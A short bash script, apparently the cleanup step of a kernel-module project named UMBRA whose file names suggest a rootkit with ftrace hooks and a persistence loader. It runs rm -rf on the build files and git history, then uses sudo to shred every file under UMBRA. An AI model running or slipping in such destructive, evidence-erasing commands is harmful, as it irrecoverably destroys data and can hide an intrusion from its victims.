#!/bin/bash

rm -rf .git
rm -rf ftrace
rm -rf include
rm -rf modules
rm -rf scripts
rm -rf ..module-common.o.cmd
rm -rf .main.o.cmd
rm -rf .module-common.o
rm -rf .Module.symvers.cmd
rm -rf .modules.order.cmd
rm -rf .umbra.ko.cmd
rm -rf .umbra.mod.cmd
rm -rf .umbra.mod.o.cmd
rm -rf .umbra.o.cmd
rm -rf load_and_persistence.sh
rm -rf main.c
rm -rf main.o
rm -rf Makefile
rm -rf Module.symvers
rm -rf modules.order
rm -rf README.md
rm -rf umbra.ko
rm -rf umbra.mod
rm -rf umbra.mod.c
rm -rf umbra.mod.o
rm -rf umbra.o
cd ..
sudo find UMBRA -type f -exec shred -u {} \; 
rm -rf UMBRA

echo "[*] Done! [*]"
